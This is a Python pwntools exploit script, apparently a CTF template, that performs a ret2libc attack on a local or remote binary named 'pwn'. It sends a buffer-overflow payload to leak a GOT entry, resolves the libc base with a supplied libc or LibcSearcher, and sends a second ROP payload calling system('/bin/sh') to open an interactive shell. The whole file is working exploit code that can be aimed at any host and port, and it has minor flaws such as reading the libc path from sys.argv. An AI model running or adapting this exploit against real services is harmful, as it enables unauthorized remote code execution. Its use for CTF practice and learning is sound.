# -*- coding: utf-8 -*-
# @Time     : 2023/11/13 0:00
# @Author   : 君叹
# @File     : ret2libc.py


import sys
import argparse

parser = argparse.ArgumentParser(description="Process some integers")
parser.add_argument('-t', type=str, help='本地 or 远程地址')
parser.add_argument('-p', type=int, help='端口号')
parser.add_argument('-b', type=str, help='bit位')
parser.add_argument('-l', type=str, help='需要指定的libc地址')

arg_list = parser.parse_args()

from pwn import *

if arg_list.t == 'local':
    io = process("./pwn")
else:
    io = remote(arg_list.t, arg_list.p)

# if len(sys.argv) > 3:
#     libc =
# gdb.attach(io, 'b main')

elf = ELF('./pwn')

func_name_got = elf.got['func_name']
func_name_plt = elf.plt['func_name']
main = elf.sym['main']
buf_length = input("[*] buf length: ")
buf_length = int(buf_length) if '0x' not in buf_length else int(buf_length, 16)
if arg_list.b == '32':
    context(arch='i386', os='linux', log_level='debug')
    to_ret = buf_length + 4
    payload = flat([cyclic(buf_length + 4), func_name_plt, main, func_name_got])
    # payload = flat([cyclic(buf_length + 4), func_name_plt, main, 0, func_name_got,, 0x10])

    io.sendline(payload)

    func_name = u32(io.recv(4))
elif arg_list.b == '64':
    context(arch='amd64', os='linux', log_level='debug')

    pop_rdi = int(input("pop_rdi"))
    # pop_rsi = int(input("pop_rsi"))
    # pop_rdx = int(input("pop_rdx"))

    to_ret = buf_length + 8
    payload = flat([cyclic(buf_length + 8), pop_rdi, func_name_got, func_name_plt, main])
    # payload = flat([cyclic(buf_length + 8), pop_rsi, func_name_got, pop_rdi, 0, pop_rdx, 0x10, func_name_plt, main])

    io.sendline(payload)

    func_name = u64(io.recv(8))
else:
    log.error("参数错误\n样例: python3 filename.py <target> <port> <bit> | <libc_path>")
    exit(0)

if arg_list.l is not None:
    libc = ELF(sys.argv[4])
    libc_base = func_name - libc.sym['func_name']
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
else:
    from LibcSearcher import *

    libc = LibcSearcher('func_name', func_name)
    libc_base = func_name - libc.dump('func_name')
    system = libc_base + libc.dump('system')
    bin_sh = libc_base + libc.dump('str_bin_sh')

if arg_list.b == '32':
    payload = flat([cyclic(to_ret), system, 0, bin_sh])
else:
    payload = flat([cyclic(to_ret), pop_rdi, bin_sh, system])

io.sendline(payload)
io.interactive()
